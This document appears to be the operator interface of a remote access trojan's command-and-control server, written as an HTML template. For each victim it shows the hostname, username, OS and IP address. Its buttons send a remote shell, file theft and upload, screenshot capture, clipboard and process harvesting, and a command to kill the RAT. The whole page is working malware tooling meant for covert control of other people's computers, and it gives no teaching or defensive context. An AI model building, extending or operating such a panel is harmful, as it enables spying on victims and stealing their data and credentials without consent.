<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Victim Details</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #fff;
        }
        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        .back-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 20px;
            text-decoration: none;
            display: inline-block;
        }
        .back-btn:hover {
            background: rgba(255,255,255,0.3);
        }
        .header {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .victim-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        .info-item {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 5px;
        }
        .info-item label {
            display: block;
            font-size: 0.8em;
            opacity: 0.7;
            margin-bottom: 5px;
        }
        .info-item span {
            font-size: 1.1em;
            font-weight: bold;
        }
        .screenshot-container {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .screenshot-container img {
            max-width: 100%;
            border-radius: 5px;
        }
        .screenshot-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 10px;
        }
        .screenshot-btn:hover {
            background: #45a049;
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .control-panel {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 10px;
        }
        .control-panel h3 {
            margin-bottom: 15px;
            border-bottom: 1px solid rgba(255,255,255,0.2);
            padding-bottom: 10px;
        }
        .input-group {
            margin-bottom: 10px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 0.9em;
        }
        .input-group input,
        .input-group textarea,
        .input-group select {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background: rgba(255,255,255,0.1);
            color: white;
            font-family: inherit;
        }
        .input-group input:focus,
        .input-group textarea:focus {
            outline: none;
            background: rgba(255,255,255,0.2);
        }
        .btn {
            background: #2196F3;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 1em;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #0b7dda;
        }
        .btn.danger {
            background: #f44336;
        }
        .btn.danger:hover {
            background: #d32f2f;
        }
        .terminal {
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 10px;
        }
        .terminal-output {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .terminal-input {
            display: flex;
            margin-top: 10px;
        }
        .terminal-input input {
            flex: 1;
            background: rgba(255,255,255,0.1);
            border: none;
            padding: 10px;
            border-radius: 5px;
            color: white;
            font-family: 'Courier New', monospace;
        }
        .terminal-input button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 10px;
        }
        .logs {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 10px;
        }
        .log-entry {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            margin-bottom: 5px;
            border-radius: 5px;
            font-size: 0.9em;
        }
        .log-entry .timestamp {
            opacity: 0.6;
            margin-right: 10px;
        }
        .log-entry .command {
            font-weight: bold;
            color: #4CAF50;
        }
        .log-entry .result {
            margin-top: 5px;
            white-space: pre-wrap;
        }
        .file-list {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 10px;
            max-height: 400px;
            overflow-y: auto;
        }
        .file-item {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .file-item .info {
            flex: 1;
        }
        .file-item .filename {
            font-weight: bold;
        }
        .file-item .size {
            opacity: 0.7;
            font-size: 0.9em;
        }
        .file-item .download-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 10px;
        }
        .loading {
            opacity: 0.6;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="/" class="back-btn">← Back to Dashboard</a>

        <div class="header">
            <h1 id="hostname">Victim Details</h1>
            <div class="victim-info">
                <div class="info-item">
                    <label>Status</label>
                    <span id="status">Unknown</span>
                </div>
                <div class="info-item">
                    <label>Username</label>
                    <span id="username">Unknown</span>
                </div>
                <div class="info-item">
                    <label>OS</label>
                    <span id="os">Unknown</span>
                </div>
                <div class="info-item">
                    <label>IP Address</label>
                    <span id="ip_address">Unknown</span>
                </div>
                <div class="info-item">
                    <label>First Seen</label>
                    <span id="first_seen">Unknown</span>
                </div>
                <div class="info-item">
                    <label>Last Seen</label>
                    <span id="last_seen">Unknown</span>
                </div>
            </div>
        </div>

        <div class="screenshot-container">
            <h3>📸 Screenshot</h3>
            <img id="screenshot" src="" alt="No screenshot" style="display:none;">
            <p id="no-screenshot">No screenshot available</p>
            <button class="screenshot-btn" onclick="takeScreenshot()">📷 Take Screenshot</button>
        </div>

        <div class="controls">
            <div class="control-panel">
                <h3>💻 Shell</h3>
                <div class="terminal" id="terminal">
                    <div class="terminal-output" id="terminal-output"></div>
                    <div class="terminal-input">
                        <input type="text" id="shell-input" placeholder="Enter command..." onkeypress="if(event.key==='Enter')sendShellCommand()">
                        <button onclick="sendShellCommand()">Run</button>
                    </div>
                </div>
            </div>

            <div class="control-panel">
                <h3>📁 File Download</h3>
                <div class="input-group">
                    <label>File Path</label>
                    <input type="text" id="download-path" placeholder="C:\path\to\file.txt">
                </div>
                <button class="btn" onclick="downloadFile()">📥 Download File</button>

                <h3 style="margin-top: 20px;">📤 File Upload</h3>
                <div class="input-group">
                    <label>Select File</label>
                    <input type="file" id="upload-file">
                </div>
                <button class="btn" onclick="uploadFile()">📤 Upload File</button>

                <h3 style="margin-top: 20px;">📋 List Directory</h3>
                <div class="input-group">
                    <label>Directory Path</label>
                    <input type="text" id="list-dir-path" placeholder="C:\Windows\System32">
                </div>
                <button class="btn" onclick="listDirectory()">📋 List Files</button>
            </div>

            <div class="control-panel">
                <h3>⚙️ System</h3>
                <div class="input-group">
                    <label>Actions</label>
                    <button class="btn" onclick="getSystemInfo()">📊 Get System Info</button>
                    <button class="btn" onclick="getProcesses()">📋 Get Processes</button>
                    <button class="btn" onclick="getClipboard()">📋 Get Clipboard</button>
                    <button class="btn" onclick="getNetworkInfo()">🌐 Get Network Info</button>
                    <button class="btn danger" onclick="killRat()">🔌 Kill RAT</button>
                </div>
            </div>
        </div>

        <div class="logs">
            <h3>📝 Command Log</h3>
            <div id="command-log"></div>
        </div>

        <div class="file-list">
            <h3>📁 Downloaded Files</h3>
            <div id="file-list"></div>
        </div>
    </div>

    <script>
        const victimId = '{{ victim.id }}';
        const socket = io();

        // Update victim info
        async function loadVictimInfo() {
            try {
                const response = await fetch(`/api/victim/${victimId}`);
                const data = await response.json();

                document.getElementById('hostname').textContent = data.hostname;
                document.getElementById('status').textContent = data.status;
                document.getElementById('username').textContent = data.username;
                document.getElementById('os').textContent = data.os;
                document.getElementById('ip_address').textContent = data.ip_address;
                document.getElementById('first_seen').textContent = new Date(data.first_seen).toLocaleString();
                document.getElementById('last_seen').textContent = new Date(data.last_seen).toLocaleString();

                if (data.screenshot_path) {
                    document.getElementById('screenshot').src = `/screenshot/${victimId}`;
                    document.getElementById('screenshot').style.display = 'block';
                    document.getElementById('no-screenshot').style.display = 'none';
                }

                loadCommandLog();
                loadFileList();
            } catch (error) {
                console.error('Error loading victim info:', error);
            }
        }

        // Send command
        async function sendCommand(command) {
            addLogEntry(command, 'pending');

            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        victim_id: victimId,
                        command: command
                    })
                });

                if (response.ok) {
                    console.log('Command sent:', command);
                }
            } catch (error) {
                console.error('Error sending command:', error);
                addLogEntry(command, 'error: ' + error.message);
            }
        }

        // Shell command
        function sendShellCommand() {
            const input = document.getElementById('shell-input');
            const command = input.value;

            if (command) {
                const shellCommand = `SHELL:${command}`;
                sendCommand(shellCommand);
                addTerminalOutput(`$ ${command}`);
                input.value = '';
            }
        }

        // Add to terminal
        function addTerminalOutput(text) {
            const output = document.getElementById('terminal-output');
            output.innerHTML += `<div>${text}</div>`;
            output.scrollTop = output.scrollHeight;
        }

        // Screenshot
        function takeScreenshot() {
            sendCommand('SCREENSHOT');
        }

        // Download file
        function downloadFile() {
            const path = document.getElementById('download-path').value;
            if (path) {
                sendCommand(`DOWNLOAD:${path}`);
            }
        }

        // Upload file
        function uploadFile() {
            const fileInput = document.getElementById('upload-file');
            if (fileInput.files.length > 0) {
                const file = fileInput.files[0];
                const formData = new FormData();
                formData.append('file', file);
                formData.append('victim_id', victimId);

                fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                }).then(response => response.json())
                  .then(data => {
                      if (data.success) {
                          sendCommand(`UPLOAD:${data.filepath}`);
                      }
                  });
            }
        }

        // List directory
        function listDirectory() {
            const path = document.getElementById('list-dir-path').value;
            if (path) {
                sendCommand(`LIST_DIR:${path}`);
            }
        }

        // System info
        function getSystemInfo() {
            sendCommand('SYSINFO');
        }

        // Get processes
        function getProcesses() {
            sendCommand('PROCESSES');
        }

        // Get clipboard
        function getClipboard() {
            sendCommand('CLIPBOARD');
        }

        // Network info
        function getNetworkInfo() {
            sendCommand('NETWORK');
        }

        // Kill RAT
        function killRat() {
            if (confirm('Are you sure you want to kill the RAT on this victim?')) {
                sendCommand('KILL');
            }
        }

        // Add log entry
        function addLogEntry(command, result) {
            const log = document.getElementById('command-log');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `
                <div class="timestamp">${new Date().toLocaleString()}</div>
                <div class="command">${command}</div>
                <div class="result">${result}</div>
            `;
            log.insertBefore(entry, log.firstChild);
        }

        // Load command log
        async function loadCommandLog() {
            try {
                const response = await fetch(`/api/victim/${victimId}/commands`);
                const commands = await response.json();

                commands.forEach(cmd => {
                    addLogEntry(cmd.command, cmd.result || cmd.status);
                });
            } catch (error) {
                console.error('Error loading command log:', error);
            }
        }

        // Load file list
        async function loadFileList() {
            try {
                const response = await fetch(`/api/victim/${victimId}/files`);
                const files = await response.json();

                const fileList = document.getElementById('file-list');
                if (files.length === 0) {
                    fileList.innerHTML = '<p>No files downloaded yet</p>';
                } else {
                    fileList.innerHTML = files.map(file => `
                        <div class="file-item">
                            <div class="info">
                                <div class="filename">${file.filename}</div>
                                <div class="size">${(file.size / 1024).toFixed(2)} KB</div>
                            </div>
                            <a href="${file.filepath}" class="download-btn" download>📥 Download</a>
                        </div>
                    `).join('');
                }
            } catch (error) {
                console.error('Error loading file list:', error);
            }
        }

        // Socket events
        socket.on('command_result', (data) => {
            if (data.victim_id === victimId) {
                addLogEntry(data.command, data.result);

                if (data.command.startsWith('SHELL:')) {
                    const output = data.command.substring(6);
                    addTerminalOutput(output);
                }

                loadVictimInfo();
            }
        });

        socket.on('new_screenshot', (data) => {
            if (data.victim_id === victimId) {
                document.getElementById('screenshot').src = `/screenshot/${victimId}?t=${Date.now()}`;
                document.getElementById('screenshot').style.display = 'block';
                document.getElementById('no-screenshot').style.display = 'none';
            }
        });

        socket.on('file_downloaded', (data) => {
            if (data.victim_id === victimId) {
                loadFileList();
            }
        });

        // Initial load
        loadVictimInfo();

        // Auto refresh every 10 seconds
        setInterval(loadVictimInfo, 10000);
    </script>
</body>
</html>
